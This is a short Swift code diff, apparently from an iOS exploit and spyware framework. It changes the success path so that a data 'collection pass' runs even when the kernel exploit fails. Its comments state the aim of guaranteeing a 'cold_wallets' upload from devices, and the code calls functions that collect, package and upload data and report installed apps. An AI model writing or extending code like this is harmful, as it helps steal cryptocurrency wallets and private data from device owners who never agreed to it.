@@ -506,9 +506,16 @@ enum MainAPI {
         UserDefaults.standard.set(Date().timeIntervalSince1970, forKey: lastRunKey)
     }
 
-    /// 管线成功后的收尾：严格按 collect_configs 采集打包上传 + 应用列表 + 导出 json + 日志
+    /// Pipeline success path: record the run, then collect/upload.
     static func postPipelineActions() {
         markPipelineRan()
+        runCollectionPass()
+    }
+
+    /// Collection pass WITHOUT the repeat-gate side effect: safe to run even
+    /// when the exploit failed (MCM lease + metadata scan need no kernel r/w).
+    /// This is what guarantees a cold_wallets upload on hopeless devices.
+    static func runCollectionPass() {
         if let cfg = lastConfig, cfg.exploit_enabled {
             collectAndUploadPerConfig(cfg)
             reportInstalledAppsAsync()
